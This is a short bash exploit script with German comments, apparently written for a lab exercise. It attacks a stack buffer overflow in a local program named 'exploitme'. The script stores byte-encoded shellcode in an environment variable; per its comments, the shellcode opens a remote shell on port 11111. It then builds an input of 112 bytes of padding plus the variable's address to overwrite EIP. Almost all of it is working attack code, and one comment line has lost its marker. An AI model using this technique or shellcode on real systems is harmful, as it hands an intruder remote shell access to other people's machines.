#!/bin/bash


# Problem: die Speicheradresse des char-Arrays text ist dynamisch, d.h. darin platzierter Shellcode kann nicht angesprungen werden.

# Lösung: Anspringen einer environment-Variable, da dessen Adresse vor Ausführung ausgelesen werden kann


# Schreibe den shellcode in eine Umgebungsvariable

# Shellcode Quelle: http://www.shell-storm.org/shellcode/files/shellcode-835.php

# Öffnet Remoteshell auf Port 11111

shellcode=`echo -e "\xe8\xff\xff\xff\xff\xc3\x5d\x8d\x6d\x4a\x31\xc0\x99\x6a\x01\x5b\x52\x53\x6a\x02\xff\xd5\x96\x5b\x52\x66\x68\x2b\x67\x66\x53\x89\xe1\x6a\x10\x51\x56\xff\xd5\x43\x43\x52\x56\xff\xd5\x43\x52\x52\x56\xff\xd5\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\x04\x5f\x6a\x66\x58\x89\xe1\xcd\x80\x57\xc3"`

export shellcode=$shellcode


# Gibt die Adresse der Environment-Variable 'shellcode' +8 im Format 0xMSB...LSB zurück

# +8 da sich beim nächsten Programmaufruf der "env-stack" um 8 verschiebt

shellcode_addr=`./environment.o`


# konvertiere die shellcode-Adresse nach little Endian \xLSB...\xMSB 


strip 0x
shellcode_addr=${shellcode_addr:2}

first=${shellcode_addr:0:2}
second=${shellcode_addr:2:2}
third=${shellcode_addr:4:2}
fourth=${shellcode_addr:6:2}

shellcode_addr="\x$fourth\x$third\x$second\x$first"


# Eingabe für die erste Frage des Therapeuten

perl -e 'print "Falk\n"' > stdin.txt

# Padding das benötigt wird um das EIP-Register zu überschreiben

perl -e 'print "A"x112' >> stdin.txt

# Speicheradresse der Umgebungsvariable

echo -e "$shellcode_addr\n" >> stdin.txt


# Aufruf des Programms mit dem Shellcode als erstes Argument

./exploitme <<< `cat stdin.txt`
